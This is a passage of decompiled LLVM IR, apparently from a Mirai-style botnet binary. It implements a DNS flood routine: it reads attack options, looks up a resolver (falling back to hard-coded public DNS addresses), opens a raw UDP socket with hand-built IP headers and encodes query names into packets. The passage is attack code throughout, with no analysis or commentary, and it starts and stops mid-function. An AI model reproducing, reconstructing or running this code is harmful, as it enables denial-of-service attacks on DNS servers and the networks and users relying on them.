  %v0_d7c4 = load i32, i32* @r5, align 4
  store i32 %v0_d7c4, i32* %r0.global-to-local, align 4
  %v5_d7c8 = inttoptr i32 %v0_d7b4 to i32*
  %v6_d7c8 = call i32 @attack_get_opt_int(i32 %v0_d7c4, i32* %v5_d7c8, i32 %v0_d7bc, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_d7d0 = load i32, i32* @sl, align 4
  store i32 %v0_d7d0, i32* %r3.global-to-local, align 4
  %v0_d7d4 = load i32, i32* @r4, align 4
  store i32 %v0_d7d4, i32* %r1.global-to-local, align 4
  %v0_d7dc = load i32, i32* @r5, align 4
  store i32 %v0_d7dc, i32* %r0.global-to-local, align 4
  %v5_d7e0 = inttoptr i32 %v0_d7d4 to i32*
  %v6_d7e0 = call i32 @attack_get_opt_str(i32 %v0_d7dc, i32* %v5_d7e0, i32 8, i32 %v0_d7d0, i32 %v6_d7c8)
  store i32 %v6_d7e0, i32* @r7, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_d7ec = call i32 @table_unlock_val(i32 37)
  %v0_d7f0 = load i32, i32* @sl, align 4
  store i32 %v0_d7f0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v2_d7f8 = inttoptr i32 %v0_d7f0 to i32*
  %v3_d7f8 = call i32 @table_retrieve_val(i32 37, i32* %v2_d7f8)
  store i32 %v3_d7f8, i32* %r0.global-to-local, align 4
  %v0_d7fc = load i32, i32* @sl, align 4
  store i32 %v0_d7fc, i32* %r1.global-to-local, align 4
  %v2_d800 = call i32 @__libc_open(i32 %v3_d7f8, i32 %v0_d7fc)
  store i32 %v2_d800, i32* @r4, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_d80c = call i32 @table_lock_val(i32 37)
  store i32 %v1_d80c, i32* %r0.global-to-local, align 4
  %v0_d810 = load i32, i32* @r4, align 4
  %v1_d810 = load i32, i32* @sl, align 4
  %v9_d810 = icmp eq i32 %v0_d810, %v1_d810
  store i1 %v9_d810, i1* %cpsr_z.global-to-local, align 1
  %v5_d814 = icmp slt i32 %v0_d810, %v1_d810
  br i1 %v5_d814, label %dec_label_pc_d8d0, label %dec_label_pc_d818

dec_label_pc_d818:                                ; preds = %entry
  %v2_d81c = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_d81c, i32* %sb.global-to-local, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_d81c, i32* @r1, align 4
  store i32 %v0_d810, i32* %r0.global-to-local, align 4
  %v1_d82c = call i32 @__libc_read(i32 %v0_d810)
  store i32 %v1_d82c, i32* @r6, align 4
  %v0_d834 = load i32, i32* @r4, align 4
  store i32 %v0_d834, i32* %r0.global-to-local, align 4
  %v1_d838 = call i32 @__GI___libc_close(i32 %v0_d834)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_d840 = call i32 @table_unlock_val(i32 38)
  %v0_d844 = load i32, i32* @sl, align 4
  store i32 %v0_d844, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v2_d84c = inttoptr i32 %v0_d844 to i32*
  %v3_d84c = call i32 @table_retrieve_val(i32 38, i32* %v2_d84c)
  %v0_d850 = load i32, i32* @r6, align 4
  store i32 %v0_d850, i32* @r1, align 4
  store i32 %v3_d84c, i32* %r2.global-to-local, align 4
  store i32 %v2_d81c, i32* %r0.global-to-local, align 4
  %v3_d85c = bitcast i32* %stack_var_-2124 to i8*
  %v4_d85c = call i32 @util_stristr(i8* %v3_d85c, i32 %v0_d850, i32 %v3_d84c)
  store i32 %v4_d85c, i32* @r8, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_d868 = call i32 @table_lock_val(i32 38)
  store i32 %v1_d868, i32* %r0.global-to-local, align 4
  %v0_d86c = load i32, i32* @r8, align 4
  %v7_d86c = icmp eq i32 %v0_d86c, -1
  store i1 %v7_d86c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d86c, label %dec_label_pc_d8d0, label %dec_label_pc_d874

dec_label_pc_d874:                                ; preds = %dec_label_pc_d818
  %v0_d874 = load i32, i32* @r6, align 4
  %v9_d874 = icmp eq i32 %v0_d874, %v0_d86c
  store i1 %v9_d874, i1* %cpsr_z.global-to-local, align 1
  %v7_d878 = icmp sgt i32 %v0_d874, %v0_d86c
  br i1 %v7_d878, label %dec_label_pc_d87c, label %dec_label_pc_d8d0

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d874
  %v0_d87c = load i32, i32* @sl, align 4
  store i32 %v0_d87c, i32* %r1.global-to-local, align 4
  %v0_d880 = load i32, i32* %sb.global-to-local, align 4
  %v2_d880 = add i32 %v0_d880, %v0_d86c
  store i32 %v2_d880, i32* %ip.global-to-local, align 4
  %v1_d890 = add i32 %v0_d874, -1
  br label %dec_label_pc_d888

dec_label_pc_d888:                                ; preds = %dec_label_pc_d8c4, %dec_label_pc_d87c
  %v0_d8c4 = phi i32 [ %v1_d8c4, %dec_label_pc_d8c4 ], [ %v0_d86c, %dec_label_pc_d87c ]
  %v0_d8ac = phi i32 [ %v0_d8ac27, %dec_label_pc_d8c4 ], [ %v0_d87c, %dec_label_pc_d87c ]
  %v0_d88c = phi i32 [ %v0_d88c23, %dec_label_pc_d8c4 ], [ %v0_d87c, %dec_label_pc_d87c ]
  %v0_d894 = phi i32 [ %v1_d894, %dec_label_pc_d8c4 ], [ %v2_d880, %dec_label_pc_d87c ]
  %v1_d888 = inttoptr i32 %v0_d894 to i8*
  %v2_d888 = load i8, i8* %v1_d888, align 1
  %v3_d888 = zext i8 %v2_d888 to i32
  store i32 %v3_d888, i32* %r0.global-to-local, align 4
  %v2_d88c = icmp eq i32 %v0_d88c, 0
  store i1 %v2_d88c, i1* %cpsr_z.global-to-local, align 1
  %v1_d894 = add i32 %v0_d894, 1
  store i32 %v1_d894, i32* %ip.global-to-local, align 4
  %v1_d898 = add nsw i32 %v3_d888, -48
  store i32 %v1_d898, i32* @lr, align 4
  br i1 %v2_d88c, label %dec_label_pc_d8a0, label %dec_label_pc_d8b0

dec_label_pc_d8a0:                                ; preds = %dec_label_pc_d888
  %v7_d8a0 = icmp eq i8 %v2_d888, 9
  store i1 %v7_d8a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d8a0, label %dec_label_pc_d8c4, label %bb

bb:                                               ; preds = %dec_label_pc_d8a0
  %v8_d8a4 = icmp eq i8 %v2_d888, 32
  store i1 %v8_d8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d8a4, label %dec_label_pc_d8c4, label %dec_label_pc_d8ac

dec_label_pc_d8ac:                                ; preds = %bb
  %v1_d8ac = add i32 %v0_d8ac, 1
  store i32 %v1_d8ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d8b0

dec_label_pc_d8b0:                                ; preds = %dec_label_pc_d888, %dec_label_pc_d8ac
  %v0_d8ac28 = phi i32 [ %v0_d8ac, %dec_label_pc_d888 ], [ %v1_d8ac, %dec_label_pc_d8ac ]
  %v0_d88c24 = phi i32 [ %v0_d88c, %dec_label_pc_d888 ], [ %v1_d8ac, %dec_label_pc_d8ac ]
  %v7_d8b0 = icmp eq i8 %v2_d888, 46
  store i1 %v7_d8b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d8b0, label %dec_label_pc_d8bc, label %bb113

bb113:                                            ; preds = %dec_label_pc_d8b0
  %v3_d8b4 = icmp ugt i32 %v1_d898, 8
  %v8_d8b4 = icmp eq i32 %v1_d898, 9
  store i1 %v8_d8b4, i1* %cpsr_z.global-to-local, align 1
  %v2_d8b8 = xor i1 %v8_d8b4, true
  %v3_d8b8 = and i1 %v3_d8b4, %v2_d8b8
  br i1 %v3_d8b8, label %dec_label_pc_dd24, label %dec_label_pc_d8bc

dec_label_pc_d8bc:                                ; preds = %dec_label_pc_d8b0, %bb113
  %v9_d8bc = icmp eq i32 %v1_d890, %v0_d8c4
  store i1 %v9_d8bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d8bc, label %dec_label_pc_dd24, label %dec_label_pc_d8c4

dec_label_pc_d8c4:                                ; preds = %dec_label_pc_d8a0, %dec_label_pc_d8bc, %bb
  %v0_d8ac27 = phi i32 [ %v0_d8ac, %dec_label_pc_d8a0 ], [ %v0_d8ac28, %dec_label_pc_d8bc ], [ %v0_d8ac, %bb ]
  %v0_d88c23 = phi i32 [ 0, %dec_label_pc_d8a0 ], [ %v0_d88c24, %dec_label_pc_d8bc ], [ 0, %bb ]
  %v1_d8c4 = add i32 %v0_d8c4, 1
  store i32 %v1_d8c4, i32* @r4, align 4
  %v9_d8c8 = icmp eq i32 %v1_d8c4, %v0_d874
  store i1 %v9_d8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d8c8, label %dec_label_pc_d8d0, label %dec_label_pc_d888

dec_label_pc_d8d0:                                ; preds = %dec_label_pc_d8c4, %dec_label_pc_d874, %dec_label_pc_d818, %entry
  %v0_d8d0 = call i32 @rand_next()
  %v1_d8d4 = urem i32 %v0_d8d0, 4
  store i32 %v1_d8d4, i32* %r0.global-to-local, align 4
  %v2_d8d8 = icmp eq i32 %v1_d8d4, 3
  store i1 %v2_d8d8, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_d8d0 to i2
  switch i2 %trunc, label %dec_label_pc_d90410 [
    i2 0, label %dec_label_pc_dd70
    i2 1, label %dec_label_pc_dd84
    i2 -2, label %dec_label_pc_dd60
    i2 -1, label %dec_label_pc_d8f4
  ]

dec_label_pc_d8f4:                                ; preds = %dec_label_pc_d8d0
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_d90410:                              ; preds = %dec_label_pc_d8d0
  unreachable

dec_label_pc_d904:                                ; preds = %dec_label_pc_dd84, %dec_label_pc_dd70, %dec_label_pc_dd60, %dec_label_pc_dd24, %dec_label_pc_d8f4
  %stack_var_-2184.0 = phi i32 [ 33686020, %dec_label_pc_d8f4 ], [ 104859200, %dec_label_pc_dd60 ], [ 707416650, %dec_label_pc_dd84 ], [ 134744072, %dec_label_pc_dd70 ], [ %v1_dd54, %dec_label_pc_dd24 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_d908 = call i32 @__GI_time(i32* null)
  %v0_d90c = load i32, i32* @r7, align 4
  %v2_d90c = icmp eq i32 %v0_d90c, 0
  store i1 %v2_d90c, i1* %cpsr_z.global-to-local, align 1
  %v1_d910 = load i32, i32* @fp, align 4
  %v2_d910 = add i32 %v1_d910, %v2_d908
  store i32 %v2_d910, i32* %r0.global-to-local, align 4
  br i1 %v2_d90c, label %dec_label_pc_dcfc, label %dec_label_pc_d91c

dec_label_pc_d91c:                                ; preds = %dec_label_pc_d904
  store i32 %v0_d90c, i32* %r0.global-to-local, align 4
  %v1_d920 = inttoptr i32 %v0_d90c to i8*
  %v2_d920 = call i32 @util_strlen(i8* %v1_d920)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d934 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_d934, i32* %r0.global-to-local, align 4
  %v7_d938 = icmp eq i32 %v3_d934, -1
  store i1 %v7_d938, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d938, label %dec_label_pc_dcfc, label %dec_label_pc_d944

dec_label_pc_d944:                                ; preds = %dec_label_pc_d91c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d94c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d94c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d960 = call i32 @__GI_setsockopt(i32 %v3_d934, i32 0, i32 3, i32 %v6_d94c, i32 4)
  store i32 %v5_d960, i32* %r0.global-to-local, align 4
  %v7_d964 = icmp eq i32 %v5_d960, -1
  store i1 %v7_d964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d964, label %dec_label_pc_dcf4, label %dec_label_pc_d96c

dec_label_pc_d96c:                                ; preds = %dec_label_pc_d944
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v3_d988 = mul i32 %v6_d794, 65536
  store i32 %v3_d988, i32* %sb.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_d998 = urem i32 %v8_d720, 65536
  %v3_d99c = urem i32 %v7_d77c, 65536
  store i32 %v3_d99c, i32* %r0.global-to-local, align 4
  %v3_d9a0 = urem i32 %v6_d794, 65536
  store i32 %v3_d9a0, i32* %r1.global-to-local, align 4
  %v3_d9a4 = urem i32 %v7_d7b0, 65536
  store i32 %v3_d9a4, i32* %r2.global-to-local, align 4
  %v2_d9a8 = icmp eq i32 %arg2, 0
  store i1 %v2_d9a8, i1* %cpsr_z.global-to-local, align 1
  %v1_d9ac = urem i32 %v6_d7c8, 256
  store i32 %v1_d9ac, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d9a8, label %dec_label_pc_dd0c.critedge, label %dec_label_pc_d9c8

dec_label_pc_d9c8:                                ; preds = %dec_label_pc_d96c
  %v3_d97c = mul i32 %v7_d7b0, 65536
  %v2_d9d4 = add i32 %v2_d920, %v1_d9ac
  %v3_d9d8 = mul i32 %v2_d9d4, 65536
  %v1_d9e4 = add i32 %v3_d9d8, 1769472
  %tmp114 = mul nuw nsw i32 %v3_d9a0, 256
  %v3_d9e8 = and i32 %tmp114, 65280
  %v1_d9ec = add i32 %v3_d9d8, 3080192
  %tmp115 = udiv i32 %v6_d794, 256
  %v4_d9fc = urem i32 %tmp115, 256
  %v5_d9fc = or i32 %v3_d9e8, %v4_d9fc
  store i32 %v5_d9fc, i32* @sb, align 4
  store i32 %v3_d97c, i32* %ip.global-to-local, align 4
  %tmp116 = udiv i32 %v1_d9e4, 256
  %v3_da04 = and i32 %tmp116, 65280
  %tmp117 = udiv i32 %v1_d9ec, 256
  %v3_da08 = and i32 %tmp117, 65280
  store i32 %v3_da08, i32* %r2.global-to-local, align 4
  %tmp118 = mul i32 %v7_d7b0, 256
  %v3_da0c = and i32 %tmp118, 65280
  %v4_da10 = udiv i32 %v1_d9e4, 16777216
  %v5_da10 = or i32 %v3_da04, %v4_da10
  store i32 %v5_da10, i32* @fp, align 4
  %tmp119 = mul i32 %v8_d720, 256
  %v3_da18 = and i32 %tmp119, 65280
  store i32 %v3_da18, i32* %r1.global-to-local, align 4
  %v4_da1c = udiv i32 %v1_d9ec, 16777216
  %v5_da1c = or i32 %v3_da08, %v4_da1c
  store i32 %v5_da1c, i32* %r3.global-to-local, align 4
  %tmp120 = udiv i32 %v7_d7b0, 256
  %v4_da20 = urem i32 %tmp120, 256
  %v5_da20 = or i32 %v4_da20, %v3_da0c
  store i32 %v5_da20, i32* @r4, align 4
  store i32 %v2_d920, i32* @lr, align 4
  %tmp121 = udiv i32 %v8_d720, 256
  %v4_da28 = urem i32 %tmp121, 256
  %v5_da28 = or i32 %v4_da28, %v3_da18
  %tmp122 = mul i32 %v7_d77c, 256
  %v3_da2c = and i32 %tmp122, 65280
  store i32 %v3_da2c, i32* %r0.global-to-local, align 4
  %tmp123 = udiv i32 %v7_d77c, 256
  %v4_da3c = urem i32 %tmp123, 256
  %v5_da3c = or i32 %v4_da3c, %v3_da2c
  store i32 %v5_da3c, i32* @r8, align 4
  store i32 0, i32* @r5, align 4
  %v1_da44 = add i32 %v2_d920, 1
  store i32 %v1_da44, i32* @r6, align 4
  %v1_da8c = trunc i32 %v6_d6fc to i8
  %sext = mul i32 %v6_d738, 16777216
  %v4_da90 = sdiv i32 %sext, 16777216
  %sext6 = mul nuw i32 %v5_da1c, 65536
  %v4_da98 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_da28, 65536
  %v4_da9c = sdiv i32 %sext7, 65536
  %sext8 = mul nuw i32 %v5_da20, 65536
  %v4_daf8 = sdiv i32 %sext8, 65536
  %v2_db1c = icmp eq i32 %v2_d920, 0
  %tmp124 = icmp slt i32 %v2_d920, 1
  %v1_daa4 = trunc i32 %v4_da90 to i8
  br label %dec_label_pc_da48

dec_label_pc_da48:                                ; preds = %dec_label_pc_db68, %dec_label_pc_d9c8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_da50 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_da50, i32* %r0.global-to-local, align 4
  store i32 %v2_d6e4, i32* %r1.global-to-local, align 4
  %v3_da58 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_da58, i32* %r3.global-to-local, align 4
  %v2_da5c = load i32, i32* @r5, align 4
  %v5_da5c = mul i32 %v2_da5c, 4
  %v6_da5c = add i32 %v5_da5c, %v2_d6e4
  %v7_da5c = inttoptr i32 %v6_da5c to i32*
  store i32 %v2_da50, i32* %v7_da5c, align 4
  %v0_da60 = load i32, i32* %r1.global-to-local, align 4
  %v1_da60 = load i32, i32* %r3.global-to-local, align 4
  %v4_da60 = mul i32 %v1_da60, 4
  %v5_da60 = add i32 %v4_da60, %v0_da60
  %v6_da60 = inttoptr i32 %v5_da60 to i32*
  %v7_da60 = load i32, i32* %v6_da60, align 4
  store i32 %v7_da60, i32* %r1.global-to-local, align 4
  %v1_da64 = inttoptr i32 %v7_da60 to i8*
  %v2_da64 = load i8, i8* %v1_da64, align 1
  %tmp = urem i8 %v2_da64, 16
  %v1_da68 = zext i8 %tmp to i32
  %v1_da6c = or i32 %v1_da68, 64
  store i32 %v1_da6c, i32* %r2.global-to-local, align 4
  %v1_da70 = trunc i32 %v1_da6c to i8
  store i8 %v1_da70, i8* %v1_da64, align 1
  %v0_da74 = load i32, i32* %r1.global-to-local, align 4
  %v1_da74 = inttoptr i32 %v0_da74 to i8*
  %v2_da74 = load i8, i8* %v1_da74, align 1
  %v1_da78 = and i8 %v2_da74, -16
  %v1_da7c = or i8 %v1_da78, 5
  store i32 %v1_d764, i32* %ip.global-to-local, align 4
  store i8 %v1_da7c, i8* %v1_da74, align 1
  store i32 %v1_d708, i32* %lr.global-to-local, align 4
  %v2_da8c = load i32, i32* %r1.global-to-local, align 4
  %v3_da8c = add i32 %v2_da8c, 1
  %v4_da8c = inttoptr i32 %v3_da8c to i8*
  store i8 %v1_da8c, i8* %v4_da8c, align 1
  store i32 %v4_da90, i32* %r3.global-to-local, align 4
  %v0_da94 = load i32, i32* %ip.global-to-local, align 4
  %v2_da94 = icmp eq i32 %v0_da94, 0
  store i1 %v2_da94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_da98, i32* %r0.global-to-local, align 4
  store i32 %v4_da9c, i32* %r2.global-to-local, align 4
  br i1 %v2_da94, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_da48
  store i32 64, i32* %lr.global-to-local, align 4
  br label %bb126

bb126:                                            ; preds = %dec_label_pc_da48, %bb125
  %v2_daa4 = load i32, i32* %r1.global-to-local, align 4
  %v3_daa4 = add i32 %v2_daa4, 8
  %v4_daa4 = inttoptr i32 %v3_daa4 to i8*
  store i8 %v1_daa4, i8* %v4_daa4, align 1
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_daac = load i32, i32* %r1.global-to-local, align 4
  %v3_daac = add i32 %v2_daac, 9
  %v4_daac = inttoptr i32 %v3_daac to i8*
  store i8 17, i8* %v4_daac, align 1
  %v0_dab0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dab0, label %bb128, label %bb127

bb127:                                            ; preds = %bb126
  %v1_dab0 = load i32, i32* %lr.global-to-local, align 4
  %v2_dab0 = trunc i32 %v1_dab0 to i16
  %v3_dab0 = load i32, i32* %r1.global-to-local, align 4
  %v4_dab0 = add i32 %v3_dab0, 6
  %v5_dab0 = inttoptr i32 %v4_dab0 to i16*
  store i16 %v2_dab0, i16* %v5_dab0, align 2
  br label %bb128

bb128:                                            ; preds = %bb126, %bb127
  store i32 ptrtoint (i32* @global_var_260b8.92 to i32), i32* @lr, align 4
  %v0_dab8 = load i32, i32* %r0.global-to-local, align 4
  %v1_dab8 = trunc i32 %v0_dab8 to i16
  %v2_dab8 = load i32, i32* %r1.global-to-local, align 4
  %v3_dab8 = add i32 %v2_dab8, 2
  %v4_dab8 = inttoptr i32 %v3_dab8 to i16*
  store i16 %v1_dab8, i16* %v4_dab8, align 2
  %v0_dabc = load i32, i32* %r2.global-to-local, align 4
  %v1_dabc = trunc i32 %v0_dabc to i16
  %v2_dabc = load i32, i32* %r1.global-to-local, align 4
  %v3_dabc = add i32 %v2_dabc, 4
  %v4_dabc = inttoptr i32 %v3_dabc to i16*
  store i16 %v1_dabc, i16* %v4_dabc, align 2
  %v2_dac0 = load i32, i32* @global_var_260b8.92, align 4
  store i32 %v2_dac0, i32* %r3.global-to-local, align 4
  %v0_dac4 = load i32, i32* %r1.global-to-local, align 4
  %v1_dac4 = add i32 %v0_dac4, 20
  store i32 %v1_dac4, i32* %r0.global-to-local, align 4
  %v1_dac8 = add i32 %v0_dac4, 41
  store i32 %v1_dac8, i32* %r2.global-to-local, align 4
  %v0_dacc = load i32, i32* @fp, align 4
  %v1_dacc = trunc i32 %v0_dacc to i16
  %v3_dacc = add i32 %v0_dac4, 24
  %v4_dacc = inttoptr i32 %v3_dacc to i16*
  store i16 %v1_dacc, i16* %v4_dacc, align 2
  %v0_dad0 = load i32, i32* @sb, align 4
  %v1_dad0 = trunc i32 %v0_dad0 to i16
  %v2_dad0 = load i32, i32* %r0.global-to-local, align 4
  %v3_dad0 = add i32 %v2_dad0, 2
  %v4_dad0 = inttoptr i32 %v3_dad0 to i16*
  store i16 %v1_dad0, i16* %v4_dad0, align 2
  %v0_dad4 = load i32, i32* %r1.global-to-local, align 4
  %v1_dad4 = add i32 %v0_dad4, 28
  store i32 %v1_dad4, i32* %ip.global-to-local, align 4
  %v0_dad8 = load i32, i32* %r2.global-to-local, align 4
  %v1_dad8 = load i32, i32* @sl, align 4
  %v2_dad8 = add i32 %v1_dad8, %v0_dad8
  store i32 %v2_dad8, i32* @r4, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_dae4 = load i32, i32* @r8, align 4
  %v1_dae4 = trunc i32 %v0_dae4 to i16
  %v3_dae4 = add i32 %v0_dad4, 20
  %v4_dae4 = inttoptr i32 %v3_dae4 to i16*
  store i16 %v1_dae4, i16* %v4_dae4, align 2
  %v0_dae8 = load i32, i32* %r3.global-to-local, align 4
  %v1_dae8 = load i32, i32* %r1.global-to-local, align 4
  %v2_dae8 = add i32 %v1_dae8, 12
  %v3_dae8 = inttoptr i32 %v2_dae8 to i32*
  store i32 %v0_dae8, i32* %v3_dae8, align 4
  %v0_daec = load i32, i32* %r0.global-to-local, align 4
  %v1_daec = trunc i32 %v0_daec to i16
  %v2_daec = load i32, i32* %ip.global-to-local, align 4
  %v3_daec = add i32 %v2_daec, 4
  %v4_daec = inttoptr i32 %v3_daec to i16*
  store i16 %v1_daec, i16* %v4_daec, align 2
  %v0_daf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_daf0 = trunc i32 %v0_daf0 to i16
  %v2_daf0 = load i32, i32* %ip.global-to-local, align 4
  %v3_daf0 = add i32 %v2_daf0, 2
  %v4_daf0 = inttoptr i32 %v3_daf0 to i16*
  store i16 %v1_daf0, i16* %v4_daf0, align 2
  store i32 %stack_var_-2184.0, i32* %r3.global-to-local, align 4
  store i32 %v4_daf8, i32* %ip.global-to-local, align 4
  %v1_dafc = load i32, i32* %r1.global-to-local, align 4
  %v2_dafc = add i32 %v1_dafc, 16
  %v3_dafc = inttoptr i32 %v2_dafc to i32*
  store i32 %stack_var_-2184.0, i32* %v3_dafc, align 4
  %v0_db00 = load i32, i32* %ip.global-to-local, align 4
  %v1_db00 = trunc i32 %v0_db00 to i16
  %v2_db00 = load i32, i32* %r1.global-to-local, align 4
  %v3_db00 = add i32 %v2_db00, 28
  %v4_db00 = inttoptr i32 %v3_db00 to i16*
  store i16 %v1_db00, i16* %v4_db00, align 2
  %v0_db04 = load i32, i32* @sl, align 4
  %v1_db04 = trunc i32 %v0_db04 to i8
  %v2_db04 = load i32, i32* %r1.global-to-local, align 4
  %v3_db04 = add i32 %v2_db04, 40
  %v4_db04 = inttoptr i32 %v3_db04 to i8*
  store i8 %v1_db04, i8* %v4_db04, align 1
  %v0_db08 = load i32, i32* @r4, align 4
  %v1_db08 = add i32 %v0_db08, 1
  store i32 %v1_db08, i32* %r0.global-to-local, align 4
  %v0_db0c = load i32, i32* @r7, align 4
  store i32 %v0_db0c, i32* %r1.global-to-local, align 4
  %v0_db10 = load i32, i32* @r6, align 4
  store i32 %v0_db10, i32* %r2.global-to-local, align 4
  %v3_db14 = call i32 @util_memcpy(i32 %v1_db08, i32 %v0_db0c, i32 %v0_db10)
  store i32 %v3_db14, i32* %r0.global-to-local, align 4
  store i32 %v2_d920, i32* %lr.global-to-local, align 4
  store i1 %v2_db1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp124, label %.dec_label_pc_db68_crit_edge, label %dec_label_pc_db2c

.dec_label_pc_db68_crit_edge:                     ; preds = %bb128
  %v5_db20 = load i32, i32* @r4, align 4
  store i32 %v5_db20, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_db68

dec_label_pc_db2c:                                ; preds = %bb128
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_db30 = load i32, i32* @r4, align 4
  store i32 %v0_db30, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_db38

dec_label_pc_db38:                                ; preds = %.thread21, %dec_label_pc_db2c
  %v1_db40 = phi i32 [ %v1_db4035, %.thread21 ], [ 0, %dec_label_pc_db2c ]
  %v0_db5419 = phi i32 [ %v0_db60, %.thread21 ], [ 0, %dec_label_pc_db2c ]
  %v1_db38 = load i32, i32* @r7, align 4
  %v2_db38 = add i32 %v1_db38, %v0_db5419
  %v3_db38 = inttoptr i32 %v2_db38 to i8*
  %v4_db38 = load i8, i8* %v3_db38, align 1
  %v6_db38 = zext i8 %v4_db38 to i32
  store i32 %v6_db38, i32* %r3.global-to-local, align 4
  %v7_db3c = icmp eq i8 %v4_db38, 46
  store i1 %v7_db3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_db3c, label %bb129, label %bb131

bb129:                                            ; preds = %dec_label_pc_db38
  %v2_db40 = trunc i32 %v1_db40 to i8
  %v3_db40 = load i32, i32* %r0.global-to-local, align 4
  %v4_db40 = inttoptr i32 %v3_db40 to i8*
  store i8 %v2_db40, i8* %v4_db40, align 1
  %v0_db48.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_db44 = load i32, i32* %ip.global-to-local, align 4
  %v1_db44 = add i32 %v0_db44, 1
  store i32 %v1_db44, i32* %r2.global-to-local, align 4
  br i1 %v0_db48.pr, label %bb132, label %bb130

bb130:                                            ; preds = %bb129
  %v2_db4817 = urem i32 %v1_db44, 256
  store i32 %v2_db4817, i32* %ip.global-to-local, align 4
  store i32 %v2_d920, i32* %r2.global-to-local, align 4
  %v0_db54.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_db54 = add i32 %v0_db54.pre, 1
  store i32 %v1_db54, i32* %r1.global-to-local, align 4
  br label %.thread21

bb131:                                            ; preds = %dec_label_pc_db38
  %v1_db4413 = add nsw i32 %v1_db40, 1
  %v2_db48 = urem i32 %v1_db4413, 256
  store i32 %v2_db48, i32* %ip.global-to-local, align 4
  store i32 %v2_d920, i32* %r2.global-to-local, align 4
  %v1_db5420 = add i32 %v0_db5419, 1
  store i32 %v1_db5420, i32* %r1.global-to-local, align 4
  br label %.thread21

bb132:                                            ; preds = %bb129
  store i32 %v2_d920, i32* %r2.global-to-local, align 4
  %v1_db50.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_db50 = load i32, i32* @r4, align 4
  %v3_db50 = add i32 %v2_db50, %v1_db50.pre
  store i32 %v3_db50, i32* %r3.global-to-local, align 4
  %v1_db5465 = add i32 %v1_db50.pre, 1
  store i32 %v1_db5465, i32* %r1.global-to-local, align 4
  %v2_db58 = add i32 %v3_db50, 1
  store i32 %v2_db58, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread21

.thread21:                                        ; preds = %bb131, %bb130, %bb132
  %v0_db60 = phi i32 [ %v1_db54, %bb130 ], [ %v1_db5420, %bb131 ], [ %v1_db5465, %bb132 ]
  %v1_db4035 = phi i32 [ %v2_db4817, %bb130 ], [ %v2_db48, %bb131 ], [ 0, %bb132 ]
  %v9_db60 = icmp eq i32 %v0_db60, %v2_d920
  store i1 %v9_db60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_db60, label %dec_label_pc_db68.loopexit, label %dec_label_pc_db38

dec_label_pc_db68.loopexit:                       ; preds = %.thread21
  %v2_db68.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t71 = trunc i32 %v1_db4035 to i8
  br label %dec_label_pc_db68

dec_label_pc_db68:                                ; preds = %.dec_label_pc_db68_crit_edge, %dec_label_pc_db68.loopexit
  %v0_db68.pre.sink.off0 = phi i8 [ 0, %.dec_label_pc_db68_crit_edge ], [ %extract.t71, %dec_label_pc_db68.loopexit ]
  %v2_db68 = phi i32 [ %v5_db20, %.dec_label_pc_db68_crit_edge ], [ %v2_db68.pre, %dec_label_pc_db68.loopexit ]
  %v3_db68 = inttoptr i32 %v2_db68 to i8*
  store i8 %v0_db68.pre.sink.off0, i8* %v3_db68, align 1
